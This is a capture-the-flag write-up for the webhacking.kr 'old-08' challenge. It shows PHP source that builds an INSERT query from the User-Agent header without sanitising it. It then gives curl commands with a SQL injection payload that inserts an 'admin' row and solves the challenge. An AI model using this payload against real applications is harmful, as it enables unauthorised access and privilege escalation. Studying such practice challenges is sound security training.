# Old 08 - SQLi (User Agent)

URL: [https://webhacking.kr/challenge/web-08/?view_source=1](https://webhacking.kr/challenge/web-08/?view_source=1)

![old-08.png](/assets/ctf/webhacking.kr/old-08.png)

```php
<?php
$agent = trim(getenv("HTTP_USER_AGENT"));
$ip = $_SERVER["REMOTE_ADDR"];
if (preg_match("/from/i", $agent)) {
    echo "<br>Access Denied!<br><br>";
    echo htmlspecialchars($agent);
    exit();
}
$db = dbconnect();

$count_ck = mysqli_fetch_array(mysqli_query($db, "select count(id) from chall8"));
if ($count_ck[0] >= 70) { mysqli_query($db, "delete from chall8"); }

$result = mysqli_query(
    $db,
    "select id from chall8 where agent='" . addslashes($_SERVER["HTTP_USER_AGENT"]) . "'"
);
$ck = mysqli_fetch_array($result);

if ($ck) {
    echo "hi <b>" . htmlentities($ck[0]) . "</b><p>";
    if ($ck[0] == "admin") {
        mysqli_query($db, "delete from chall8");
        solve(8);
    }
}

if (!$ck) {
    ($q = mysqli_query(
        $db,
        "insert into chall8(agent,ip,id) values('{$agent}','{$ip}','guest')"
    )) or die("query error");
    echo "<br><br>done!  ({$count_ck[0]}/70)";
}
?>
```

After refreshing the page we get:

![old-08-1.png](/assets/ctf/webhacking.kr/old-08-1.png)

Looks like the User-Agent we use is the injection point, but same agent can only be used once.

The Select query with our agent seems same as it's using `addslashes`, but Insert query is not so sanitized, that should be the injection point.

First make a request with injection header value and then request injected header value to pwn the room:
```powershell
➜ curl 'https://webhacking.kr/challenge/web-08/' -b 'PHPSESSID=hi4uvai5sde90encr0ktq6879f' -A "uwu','1.1.1.1','admin') #"
...
<br><br>done!  (20/70)<a href=./?view_source=1>view-source</a>
...
➜ curl 'https://webhacking.kr/challenge/web-08/' -b 'PHPSESSID=hi4uvai5sde90encr0ktq6879f' -A "uwu"
...
hi <b>admin</b><p><script>alert('old-08 Pwned!');</script><hr>old-08 Pwned. You got 35point. Congratz!<hr><a href=./?view_source=1>view-source</a>
...
```